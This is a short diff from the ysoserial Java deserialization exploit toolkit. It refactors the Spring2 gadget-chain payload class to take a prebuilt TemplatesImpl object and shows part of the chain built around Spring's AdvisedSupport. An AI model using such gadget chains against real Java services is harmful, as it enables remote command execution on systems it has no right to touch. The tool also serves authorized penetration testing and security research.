@@ -43,11 +43,10 @@ import ysoserial.payloads.util.Reflections;
     "aopalliance:aopalliance:1.0", "commons-logging:commons-logging:1.2"
 } )
 @Authors({ Authors.MBECHLER })
-public class Spring2 extends PayloadRunner implements ObjectPayload<Object> {
+public class Spring2 extends ParameterizedTransletObjectPayload<Object> {
 
-    public Object getObject ( final String command ) throws Exception {
-        final Object templates = Gadgets.createTemplatesImpl(command);
-
+    @Override
+    protected Object getObject(Object templates) throws Exception {
         AdvisedSupport as = new AdvisedSupport();
         as.setTargetSource(new SingletonTargetSource(templates));
 
@@ -73,4 +72,5 @@ public class Spring2 extends PayloadRunner implements ObjectPayload<Object> {
     public static boolean isApplicableJavaVersion() {
         return JavaVersion.isAnnInvHUniversalMethodImpl();
     }
+
 }
